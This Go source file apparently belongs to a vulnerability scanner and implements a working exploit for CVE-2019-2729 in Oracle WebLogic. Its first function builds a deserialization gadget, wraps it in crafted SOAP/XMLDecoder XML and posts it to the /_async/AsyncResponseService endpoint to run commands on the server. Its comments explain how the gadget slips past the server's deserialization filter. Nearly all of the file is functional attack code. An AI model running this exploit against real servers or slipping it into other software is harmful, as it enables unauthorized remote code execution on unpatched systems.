package weblogic

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// exploitAsync2729 implements CVE-2019-2729: the /_async/AsyncResponseService
// endpoint of WebLogic 12.2.1.3 still processes a WorkContext XMLDecoder
// document. The payload instantiates
// oracle.toplink.internal.sessions.UnitOfWorkChangeSet(byte[]), whose
// constructor deserializes the wrapped stream. Because the gadget is unpacked
// by the EJB/TopLink ObjectInputStream (not by the T3 FilteringObjectInputStream
// added in 12.2.1.3), the Classic CommonsCollections1 chain is still accepted.
func exploitAsync2729(o ExploitOptions) (string, error) {
	marker := fmt.Sprintf("%d", time.Now().UnixNano()%1000000)
	// The gadget ends in Runtime.exec(String), so the command must not contain
	// spaces other than the "bash -c" separator.
	script := buildScriptNoSpace(marker)
	blob := buildFromTemplate(templateCC1, templates["CVE_2015_4852"], script)

	xml := buildUnitOfWorkChangeSetXML(blob)
	base := baseOf(o)
	req, err := http.NewRequest("POST", base+"/_async/AsyncResponseService", bytes.NewBufferString(xml))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "text/xml")
	req.Header.Set("User-Agent", "cve-scanner")
	client := &http.Client{Timeout: o.Timeout, Transport: pickTransport(nil)}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("POST /_async/AsyncResponseService: %w", err)
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode == 404 {
		return "", fmt.Errorf("/_async/AsyncResponseService not deployed (HTTP 404)")
	}

	out, err := readBack(base, marker, o.Timeout+8*time.Second)
	if err != nil {
		return "", fmt.Errorf("%w (trigger HTTP %d: %s)", err, resp.StatusCode, strings.TrimSpace(string(body)))
	}
	return out, nil
}

// buildUnitOfWorkChangeSetXML renders the serialized gadget as the byte[] that
// UnitOfWorkChangeSet's constructor feeds into an ObjectInputStream.
func buildUnitOfWorkChangeSetXML(blob []byte) string {
	var b strings.Builder
	b.WriteString(`<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><array method="forName"><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void>
`)
	fmt.Fprintf(&b, `<array class="byte" length="%d">`, len(blob))
	for i, c := range blob {
		fmt.Fprintf(&b, `<void index="%d"><byte>%d</byte></void>`, i, int8(c))
	}
	b.WriteString(`</array>
</void></array></java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>`)
	return b.String()
}
